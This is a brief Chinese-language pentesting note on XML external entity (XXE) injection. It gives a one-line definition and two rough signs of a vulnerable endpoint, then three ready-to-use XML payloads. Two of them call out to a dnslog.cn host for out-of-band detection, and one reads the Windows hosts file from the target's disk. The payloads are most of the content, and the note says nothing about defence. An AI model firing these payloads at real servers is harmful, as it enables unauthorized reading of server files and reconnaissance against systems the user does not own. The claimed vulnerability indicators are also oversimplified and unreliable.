# 

# XXE漏洞

XXE漏洞——XML外部实体注入漏洞，通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。

​	

## XXE的特征

- URL的后缀是 `.ashx`
- 响应体是XML

​	

## payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ 
<!ENTITY % xxe SYSTEM "60m4f9.dnslog.cn" > %xxe; ]>
```

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "60m4f9.dnslog.cn">
]>
<r>&sp;</r>
```

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<r>&sp;</r>
```


